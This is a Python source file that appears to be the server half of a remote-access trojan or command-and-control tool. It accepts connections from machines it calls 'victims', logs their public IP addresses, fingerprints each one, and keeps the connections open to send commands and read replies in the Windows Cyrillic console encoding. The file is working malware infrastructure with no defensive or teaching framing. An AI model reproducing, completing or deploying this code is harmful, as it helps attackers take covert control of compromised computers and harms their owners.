import json

import select, socket, hashlib

BUFSIZE: int = 8192
ENCODING: str = 'cp866'


class Server:
    def __init__(self, ip: str, port: int):
        self.ip = ip
        self.port = port
        self.victims = {}
        self.victim = None

    def send_data(self, info_hash: str, data: str):
        sock = self.victims[info_hash][0]

        sock.send(data.encode(encoding=ENCODING))

    def get_data(self, info_hash: str):
        sock = self.victims[info_hash][0]

        while True:
            try:
                data = sock.recv(BUFSIZE).decode(encoding=ENCODING)
                return data
            except BlockingIOError:
                continue

    def start(self):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind((self.ip, self.port))
            server.listen()

            print('[+] Waiting for connections...')

            inputs = [server]

            while True:
                readable, _, _ = select.select(inputs, [], [])

                for sock in readable:
                    if sock == server:
                        victim, addr = sock.accept()
                        inputs.append(victim)

                    else:
                        print(
                            f'[+] Got connection')

                        data: bytes = sock.recv(BUFSIZE)

                        if data:
                            info_hash = hashlib.sha256(data).hexdigest()

                            if info_hash in self.victims:
                                pass

                            else:
                                print(
                                    f'[+] Got connection from: {json.loads(data.decode(encoding=ENCODING))['victim']['public_ip']}')
                                self.victims[info_hash] = [sock, data]

                        else:
                            sock.close()

                        inputs.remove(sock)
